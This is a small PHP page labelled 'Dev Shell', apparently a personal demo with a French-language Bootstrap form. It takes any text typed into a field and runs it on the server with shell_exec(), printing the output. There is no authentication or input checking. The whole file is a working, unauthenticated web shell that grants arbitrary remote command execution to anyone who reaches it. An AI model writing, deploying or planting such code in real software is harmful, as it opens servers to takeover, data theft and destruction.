<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="Han Nim">
    <meta charset="utf-8">
    <link rel="shortcut icon" href="https://avatars1.githubusercontent.com/u/44907451?s=460&u=bf2a78b4b34b4d74632b118327e42a3f08334770&v=4" />
    <title>Dev Shell</title>
    <!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    
  </head>

<body>

<div class="container">
<h1 class="text-center">Shell Dev Demo</h1>
<form action="index.php" method="POST">
  <div class="form-group">
    <label for="exampleInputEmail1">Tapez une commande ici</label>
    <input type="text" class="form-control" name="in_command"  placeholder="Tapez une commande" size="10">
    <small id="emailHelp" class="form-text text-muted">La commande retourne le resultat du cmd (Windows) ou Terminal Linux</small>
  </div>
  <button type="submit" class="btn btn-primary">Executer</button>
</form>

<?php
if(isset($_POST['in_command'])){
    $command = $_POST['in_command'];
    $output = shell_exec($command);
echo "<pre>$output</pre>"; 
}else {
    echo 'Veuilez entrer une commande' ;
}

?>
</body>
</html>





